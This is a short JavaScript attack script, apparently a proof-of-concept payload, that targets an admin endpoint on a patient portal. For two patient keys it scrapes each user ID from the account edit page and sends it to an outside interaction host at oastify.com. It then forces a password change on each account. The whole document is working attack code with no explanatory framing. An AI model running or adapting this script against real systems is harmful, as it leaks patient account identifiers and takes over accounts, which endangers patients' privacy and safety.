for (let i = 199326; i <= 199327; i++) {
  fetch(`https://pateng.erad.com/Admin/AdminUsers/Edit?aPatientKey=${i}`)
    .then(res => res.text())
    .then(res => {
      let match = res.match(/id='UserIDText'>(.*?)<\/span>/);
      if (match) {
        fetch(`https://sqm50mxj4zrnrbg5zyi50xhdy44vslga.oastify.com?data=${encodeURIComponent(match[1])}`);
      }
      return fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `aPatientKey=${i}&NewPassword=Test%40123%4012`
      });
    });
}
